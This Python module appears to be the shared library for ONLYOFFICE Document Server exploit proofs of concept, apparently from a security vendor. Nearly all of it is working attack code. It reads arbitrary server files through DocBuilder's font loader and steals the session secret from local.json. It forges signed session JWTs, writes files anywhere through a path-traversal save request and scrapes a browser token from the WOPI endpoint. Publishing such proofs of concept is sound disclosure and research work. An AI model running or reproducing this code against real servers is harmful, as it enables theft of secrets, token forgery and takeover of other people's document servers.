"""Shared transport, input and output handling for the ONLYOFFICE PoCs."""

from __future__ import annotations

import argparse
import base64
import binascii
import hashlib
import hmac
import io
import json
import math
import os
import re
import ssl
import stat
import sys
import tempfile
import time
import uuid
import xml.etree.ElementTree as ET
import zipfile
from http.server import ThreadingHTTPServer
from pathlib import Path
from urllib.parse import urljoin, urlsplit

import requests
import urllib3

LOCAL_JSON = "/etc/onlyoffice/documentserver/local.json"


class ListenerServer(ThreadingHTTPServer):
    """Apply connection timeouts before a deferred TLS handshake in a worker."""

    daemon_threads = True

    def __init__(self, address, handler, cert: Path | None, key: Path | None):
        self.tls_context = None
        if cert and key:
            self.tls_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            self.tls_context.minimum_version = ssl.TLSVersion.TLSv1_2
            self.tls_context.load_cert_chain(cert, key)
        super().__init__(address, handler)

    def get_request(self):
        connection, address = super().get_request()
        connection.settimeout(10)
        try:
            if self.tls_context:
                connection = self.tls_context.wrap_socket(
                    connection, server_side=True, do_handshake_on_connect=False
                )
            return connection, address
        except BaseException:
            connection.close()
            raise

    def handle_error(self, request, client_address):
        if isinstance(sys.exc_info()[1], (ssl.SSLError, ConnectionError, TimeoutError)):
            return
        super().handle_error(request, client_address)


class ExploitError(RuntimeError):
    """An expected failure with an operator-readable explanation."""


class BuilderError(ExploitError):
    """The target rejected or failed a DocBuilder job."""


class TransportError(ExploitError):
    def __init__(self, method: str, kind: str):
        self.kind = kind
        super().__init__(f"{method} request failed ({kind})")


def status(message: str) -> None:
    print(message, file=sys.stderr, flush=True)


def positive_timeout(value: str) -> float:
    try:
        number = float(value)
    except ValueError:
        raise argparse.ArgumentTypeError("timeout must be a number") from None
    if not math.isfinite(number) or not 0 < number <= 86400:
        raise argparse.ArgumentTypeError("timeout must be positive, finite and no greater than 86400 seconds")
    return number


def port_number(value: str) -> int:
    try:
        port = int(value)
    except ValueError:
        raise argparse.ArgumentTypeError("port must be an integer") from None
    if not 1 <= port <= 65535:
        raise argparse.ArgumentTypeError("port must be between 1 and 65535")
    return port


def http_url(value: str, name: str, *, origin: bool = False, allow_credentials: bool = False) -> str:
    try:
        parsed = urlsplit(value)
        valid = parsed.scheme in {"http", "https"} and parsed.hostname and parsed.port != 0
    except ValueError:
        valid = False
    if not valid or any(c.isspace() or ord(c) < 32 for c in value):
        raise ExploitError(f"{name} must be an absolute HTTP(S) URL")
    if not allow_credentials and (parsed.username is not None or parsed.password is not None):
        raise ExploitError(f"{name} must not contain embedded credentials")
    if parsed.fragment or parsed.query:
        raise ExploitError(f"{name} must not contain a query or fragment")
    if origin and parsed.path not in {"", "/"}:
        raise ExploitError(f"{name} must be a bare origin, without a path")
    return value.rstrip("/") if origin else value


def remote_path(value: str, name: str) -> str:
    if not value.startswith("/") or "\x00" in value:
        raise ExploitError(f"{name} must be an absolute server path without NUL bytes")
    return value


def add_network_args(parser: argparse.ArgumentParser, *, timeout: float = 180) -> None:
    parser.add_argument("--documentserver", required=True, help="bare HTTP(S) target origin")
    parser.add_argument("--proxy", help="HTTP(S) proxy; overrides environment proxy settings")
    tls = parser.add_mutually_exclusive_group()
    tls.add_argument("--ca-file", type=Path, help="CA bundle for target and result downloads")
    tls.add_argument("--insecure", action="store_true", help="disable server TLS verification")
    parser.add_argument(
        "--timeout",
        type=positive_timeout,
        default=timeout,
        help="request timeout; also command polling budget (seconds)",
    )


def network_options(args: argparse.Namespace) -> dict:
    origin = http_url(args.documentserver, "--documentserver", origin=True)
    if args.proxy:
        http_url(args.proxy, "--proxy", allow_credentials=True)
    if args.ca_file and not args.ca_file.is_file():
        raise ExploitError("--ca-file does not name a readable CA bundle")
    if args.ca_file:
        with args.ca_file.open("rb"):
            pass
    if args.insecure:
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        status("[*] TLS verification disabled")
    return {
        "origin": origin,
        "verify": False if args.insecure else str(args.ca_file) if args.ca_file else True,
        "timeout": args.timeout,
        "proxy": args.proxy,
    }


def decode_jwt(token: str) -> dict:
    parts = token.split(".")
    if len(parts) != 3 or not all(parts) or any(c.isspace() for c in token):
        raise ExploitError("token is not a compact signed JWT")
    try:
        claims = json.loads(base64.urlsafe_b64decode(parts[1] + "=" * (-len(parts[1]) % 4)))
    except (ValueError, UnicodeError, binascii.Error):
        raise ExploitError("could not decode JWT claims") from None
    if not isinstance(claims, dict):
        raise ExploitError("JWT claims must be an object")
    return claims


def read_token(path: Path) -> str:
    try:
        token = read_local_file(path, "token file", limit=1024 * 1024).decode("ascii").strip()
    except (OSError, UnicodeError) as error:
        raise ExploitError(f"could not read token file: {error}") from None
    claims = decode_jwt(token)
    expires = claims.get("exp")
    if isinstance(expires, (int, float)) and expires <= time.time():
        raise ExploitError("JWT has expired; obtain a fresh token")
    return token


def read_local_file(path: Path, label: str, *, limit: int = 128 * 1024 * 1024) -> bytes:
    if not stat.S_ISREG(path.stat().st_mode):
        raise ExploitError(f"{label} must be a regular local file")
    with path.open("rb") as source:
        data = source.read(limit + 1)
    if len(data) > limit:
        raise ExploitError(f"{label} exceeds the {limit} byte input limit")
    return data


class OutputFile:
    """Reserve a private temporary file; replace the destination only on success."""

    def __init__(self, path: Path, *, overwrite: bool = False):
        self.path = path.absolute()
        self.overwrite = overwrite
        self.committed = False
        if self.path.is_symlink() or (self.path.exists() and not self.path.is_file()):
            raise ExploitError(f"output is not a regular file: {path}")
        if self.path.exists() and not overwrite:
            raise ExploitError(f"output already exists: {path}; choose another path or use --overwrite")
        fd, name = tempfile.mkstemp(prefix=f".{self.path.name}.", dir=self.path.parent)
        self.temp = Path(name)
        os.close(fd)

    def __enter__(self):
        return self

    def write(self, data: bytes) -> None:
        self.temp.write_bytes(data)
        if self.overwrite:
            if self.path.is_symlink():
                raise ExploitError(f"refusing to replace a symbolic link: {self.path}")
            os.replace(self.temp, self.path)
        else:
            # Atomic no-overwrite publication, including a destination created mid-run.
            os.link(self.temp, self.path)
            self.temp.unlink()
        self.committed = True

    def __exit__(self, *_args) -> None:
        self.temp.unlink(missing_ok=True)


class DocumentServer:
    def __init__(self, origin: str, *, verify: bool | str, timeout: float, proxy: str | None):
        self.origin = origin
        self.verify = verify
        self.timeout = timeout
        self.proxies = {"http": proxy, "https": proxy} if proxy else None
        self.session = requests.Session()

    def __enter__(self):
        return self

    def __exit__(self, *_args):
        self.session.close()

    def request(self, method: str, url: str, **kwargs) -> requests.Response:
        kwargs.setdefault("timeout", self.timeout)
        kwargs.setdefault("allow_redirects", False)
        try:
            return self.session.request(method, url, verify=self.verify, proxies=self.proxies, **kwargs)
        except requests.RequestException as error:
            # Requests exceptions can include URLs containing JWTs. Never echo them.
            raise TransportError(method, type(error).__name__) from None

    def json_response(self, response: requests.Response, stage: str) -> dict:
        if response.status_code != 200:
            raise ExploitError(f"{stage} returned HTTP {response.status_code}")
        try:
            result = response.json()
        except ValueError:
            raise ExploitError(f"{stage} returned non-JSON content") from None
        if not isinstance(result, dict):
            raise ExploitError(f"{stage} returned JSON that is not an object")
        return result

    def download(self, url: str, *, timeout: float | None = None, limit: int = 128 * 1024 * 1024) -> bytes:
        parsed = urlsplit(url)
        if parsed.scheme not in {"http", "https"} or not parsed.hostname or parsed.username:
            raise ExploitError("target returned an invalid HTTP(S) result URL")
        options = {"timeout": timeout} if timeout else {}
        with self.request("GET", url, stream=True, **options) as response:
            if response.status_code != 200:
                raise ExploitError(
                    f"result download returned HTTP {response.status_code}; redirects are not followed"
                )
            result = bytearray()
            try:
                for chunk in response.iter_content(65536):
                    result.extend(chunk)
                    if len(result) > limit:
                        raise ExploitError(f"result exceeds the {limit // (1024 * 1024)} MiB download limit")
            except requests.RequestException as error:
                raise ExploitError(f"result download failed ({type(error).__name__})") from None
            return bytes(result)

    def submit_builder(self, token: str, script: str, *, timeout: float | None = None) -> dict:
        options = {"timeout": timeout} if timeout else {}
        response = self.request(
            "POST",
            f"{self.origin}/docbuilder",
            params={"token": token},
            data=script.encode(),
            headers={"Content-Type": "application/octet-stream"},
            **options,
        )
        result = self.json_response(response, "DocBuilder")
        if result.get("end") is not True or result.get("error") not in (None, 0, "0"):
            code = result.get("error")
            detail = f" (code {code})" if isinstance(code, (int, float)) else ""
            raise BuilderError(f"DocBuilder rejected or failed the job{detail}")
        return result

    def run_builder(
        self, token: str, script: str, output_name: str, *, timeout: float | None = None
    ) -> bytes:
        deadline = time.monotonic() + timeout if timeout is not None else None
        result = self.submit_builder(token, script, timeout=timeout)
        urls = result.get("urls")
        if isinstance(urls, dict):
            candidates = [
                value
                for name, value in urls.items()
                if isinstance(value, str) and (output_name in str(name) or output_name in value)
            ]
        elif isinstance(urls, list):
            candidates = [value for value in urls if isinstance(value, str) and output_name in value]
        else:
            candidates = []
        if len(set(candidates)) != 1:
            raise ExploitError("DocBuilder did not return one expected output document")
        if deadline is not None:
            timeout = deadline - time.monotonic()
            if timeout <= 0:
                raise ExploitError("DocBuilder stage exceeded its remaining polling budget")
        return self.download(urljoin(self.origin + "/", candidates[0]), timeout=timeout)

    def post_save(self, token: str, command: dict, data: bytes) -> dict:
        command = {
            "c": "save",
            "id": "ignored",
            "tokenSession": token,
            "saveindex": 1,
            "outputformat": 0x0201,
            "withoutPassword": True,
            **command,
        }
        response = self.request(
            "POST",
            f"{self.origin}/downloadas/ignored",
            params={"cmd": json.dumps(command, separators=(",", ":"))},
            data=data,
            headers={"Content-Type": "application/octet-stream"},
        )
        return self.json_response(response, "/downloadas")

    def reserve_save(self, token: str, document_key: str) -> str:
        result = self.post_save(token, {"id": document_key, "format": "bin", "savetype": 0}, b"reservation")
        key = result.get("data")
        if result.get("status") != "ok" or not isinstance(key, str) or not key:
            raise ExploitError("session JWT could not reserve a save key")
        return key

    def write_server_file(
        self, token: str, document_key: str, save_key: str, target_path: str, payload: bytes
    ) -> None:
        if not payload:
            raise ExploitError("empty writes are unsupported by the vulnerable save branch")
        traversal = "/" + "/".join([".."] * 32 + [remote_path(target_path, "target path").lstrip("/")])
        result = self.post_save(
            token, {"id": document_key, "savekey": save_key, "format": traversal, "savetype": 3}, payload
        )
        if result.get("status") != "ok" or result.get("data") != save_key:
            raise ExploitError("traversal write was rejected")

    def launch_wopi(self, public_url: str) -> str:
        response = self.request(
            "POST",
            f"{self.origin}/hosting/wopi/word/edit",
            params={"wopisrc": public_url},
            data={"access_token": ""},
        )
        if response.status_code != 200:
            raise ExploitError(f"WOPI launch returned HTTP {response.status_code}")
        matches = re.findall(r'\bvar\s+token\s*=\s*"([A-Za-z0-9_.-]+)"', response.text)
        if len(matches) != 1:
            raise ExploitError("WOPI launch did not expose one Browser JWT")
        decode_jwt(matches[0])
        return matches[0]


def read_server_file(
    client: DocumentServer,
    token: str,
    path: str,
    *,
    unavailable_ok: bool = False,
    timeout: float | None = None,
) -> bytes | None:
    nonce = uuid.uuid4().hex
    name, tag = f"r7-read-{nonce}.docx", f"R7FILE_{nonce}:"
    script = f"""builder.CreateFile("docx");
var bytes = native.GetFontBinary({json.dumps(path)});
// GetFontBinary falls back to a default font when the requested path is absent.
// A per-job nonexistent path detects that response without exporting font data.
var fallback = native.GetFontBinary("/__r7_missing_{nonce}");
var isFallback = bytes && fallback && bytes.length === fallback.length;
if (isFallback) {{
    for (var j = 0; j < bytes.length; j++) {{
        if (bytes[j] !== fallback[j]) {{ isFallback = false; break; }}
    }}
}}
var text = "UNAVAILABLE";
if (bytes !== null && typeof bytes !== "undefined" && !isFallback) {{
    text = "";
    for (var i = 0; i < bytes.length; i++) text += ("0" + bytes[i].toString(16)).slice(-2);
}}
var p = Api.CreateParagraph();
p.AddText({json.dumps(tag)} + text + ":END");
Api.GetDocument().Push(p);
builder.SaveFile("docx", {json.dumps(name)});
builder.CloseFile();"""
    document = client.run_builder(token, script, name, timeout=timeout)
    try:
        with zipfile.ZipFile(io.BytesIO(document)) as archive:
            info = archive.getinfo("word/document.xml")
            if info.file_size > 256 * 1024 * 1024:
                raise ExploitError("DocBuilder XML exceeds the 256 MiB extraction limit")
            xml = archive.read(info)
        text = "".join(ET.fromstring(xml).itertext())
    except (KeyError, ET.ParseError, zipfile.BadZipFile):
        raise ExploitError("DocBuilder output is not a readable DOCX") from None
    match = re.search(re.escape(tag) + r"(UNAVAILABLE|[0-9a-f]*):END", text)
    if match is None or (match[1] != "UNAVAILABLE" and len(match[1]) % 2):
        raise ExploitError("file data was not present in the DocBuilder output")
    if match[1] == "UNAVAILABLE":
        if unavailable_ok:
            return None
        raise ExploitError(f"server file was unavailable or matched the default font fallback: {path}")
    return bytes.fromhex(match[1])


def recover_session_key(client: DocumentServer, token: str) -> bytes:
    config_bytes = read_server_file(client, token, LOCAL_JSON)
    try:
        config = json.loads(config_bytes)
        session = config["services"]["CoAuthoring"]["secret"]["session"]
    except (KeyError, TypeError, ValueError, UnicodeError):
        raise ExploitError(f"could not locate the session secret in {LOCAL_JSON}") from None
    status(f"[+] read {LOCAL_JSON} through DocBuilder")
    if isinstance(session, dict) and isinstance(session.get("string"), str) and session["string"]:
        return session["string"].encode()
    if isinstance(session, dict) and isinstance(session.get("file"), str) and session["file"]:
        secret = read_server_file(client, token, remote_path(session["file"], "session key file"))
        if secret:
            status("[+] read the configured session-key file")
            return secret
    raise ExploitError("the configured session secret is empty or unsupported")


def forge_session_token(secret: bytes, document_key: str) -> tuple[str, int]:
    def b64(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

    now = int(time.time())
    expires = now + 300
    claims = {
        "document": {"key": document_key, "permissions": {"download": True, "print": True}},
        "editorConfig": {"user": {"id": "rapid7-poc", "index": 1}},
        "iat": now,
        "exp": expires,
    }
    message = ".".join(
        b64(json.dumps(part, separators=(",", ":")).encode())
        for part in ({"alg": "HS256", "typ": "JWT"}, claims)
    )
    signature = hmac.new(secret, message.encode(), hashlib.sha256).digest()
    return message + "." + b64(signature), expires


def entrypoint(run) -> None:
    try:
        code = run()
    except KeyboardInterrupt:
        status("\n[-] interrupted; submitted target jobs may still be running")
        code = 130
    except (ExploitError, OSError, ValueError) as error:
        status(f"[-] {error}")
        code = 1
    raise SystemExit(code)
